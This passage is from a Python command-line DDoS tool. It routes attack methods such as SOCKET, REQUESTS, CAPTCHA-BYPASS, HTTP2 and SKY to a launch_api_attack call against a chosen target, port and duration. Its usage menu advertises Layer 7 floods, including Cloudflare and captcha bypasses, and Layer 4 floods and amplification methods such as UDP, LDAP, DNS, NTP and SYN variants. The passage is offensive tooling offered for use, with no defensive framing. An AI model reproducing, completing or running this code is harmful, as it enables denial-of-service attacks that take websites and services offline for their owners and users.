                timer = threading.Thread(target=countdown, args=(t,))
                timer.start()
                launch_api_attack(target, "80", t, "SOCKET")
                timer.join()
            elif method == "pxsoc":
                timer = threading.Thread(target=countdown, args=(t,))
                timer.start()
                launch_api_attack(target, "80", t, "SOCKET")
                timer.join()
            elif method == "cfreq" or method == "REQUESTS":
                timer = threading.Thread(target=countdown, args=(t,))
                timer.start()
                launch_api_attack(target, "443", t, "REQUESTS")
                timer.join()
            elif method == "cfsoc" or method == "CAPTCHA-BYPASS":
                timer = threading.Thread(target=countdown, args=(t,))
                timer.start()
                launch_api_attack(target, "443", t, "CAPTCHA-BYPASS")
                timer.join()
            elif method == "http2" or method == "TLS":
                timer = threading.Thread(target=countdown, args=(t,))
                timer.start()
                launch_api_attack(target, "443", t, "HTTP2")
                timer.join()
            elif method == "pxhttp2":
                timer = threading.Thread(target=countdown, args=(t,))
                timer.start()
                launch_api_attack(target, "443", t, "HTTP2")
                timer.join()
            elif method == "pxsky":
                timer = threading.Thread(target=countdown, args=(t,))
                timer.start()
                launch_api_attack(target, "443", t, "SKY")
                timer.join()
            elif method == "sky" or method == "HTTPS":
                timer = threading.Thread(target=countdown, args=(t,))
                timer.start()
                launch_api_attack(target, "443", t, "SKY")
                timer.join()
            else:
                stdout.write("Layer 7: CLOUDFLARE, RAW, HEAVYJES, REQUESTS, HTTP, HTTPS, CAPTCHA-BYPASS, CFBYPASSV2, SOCKET, TLS\n")
                stdout.write("Layer 4: UDP, LDAP, ARD, VOX, STUN, VSE, ACK, IPX, KGB, PROWIN, DNS, NTP, TCP, WIZARD, XSYN, ZAP, ZSYN\n")
                stdout.write(f"usage:~# python3 {sys.argv[0]} <method> <target> <time>\n")
                stdout.write(f"usage:~# python3 {sys.argv[0]} <method> <target> <port> <time>\n")
                sys.exit()
        else:
            stdout.write("Layer 7: CLOUDFLARE, RAW, HEAVYJES, REQUESTS, HTTP, HTTPS, CAPTCHA-BYPASS, CFBYPASSV2, SOCKET, TLS\n")
            stdout.write("Layer 4: UDP, LDAP, ARD, VOX, STUN, VSE, ACK, IPX, KGB, PROWIN, DNS, NTP, TCP, WIZARD, XSYN, ZAP, ZSYN\n")
            stdout.write(f"usage:~# python3 {sys.argv[0]} <method> <target> <time>\n")
            stdout.write(f"usage:~# python3 {sys.argv[0]} <method> <target> <port> <time>\n")
            sys.exit()
    except KeyboardInterrupt:
        stdout.write("\n" + Fore.RED + " [!] keyboard interrupted." + Fore.WHITE + "\n")
        sys.exit()